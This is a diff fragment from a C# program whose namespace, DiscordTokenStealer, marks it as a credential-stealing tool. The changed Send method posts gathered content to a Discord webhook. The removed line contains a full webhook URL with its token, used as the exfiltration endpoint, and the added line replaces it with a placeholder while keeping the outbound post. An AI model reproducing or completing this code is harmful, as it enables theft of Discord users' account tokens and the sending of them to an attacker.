@@ -115,7 +115,7 @@ namespace DiscordTokenStealer
             }
             public static void Send(string content)
             {
-                string webHookUrl = "https://discord.com/api/webhooks/902019590626869259/Q3Qw5plN18594iopmhyEqx1-T2vvAmmqwy5jRR56raKu4bj22-Vxpp1Lt-_qdxtZLhQv";
+                string webHookUrl = "webhook";
                 Http.Post(webHookUrl, new NameValueCollection()
             {
                 {
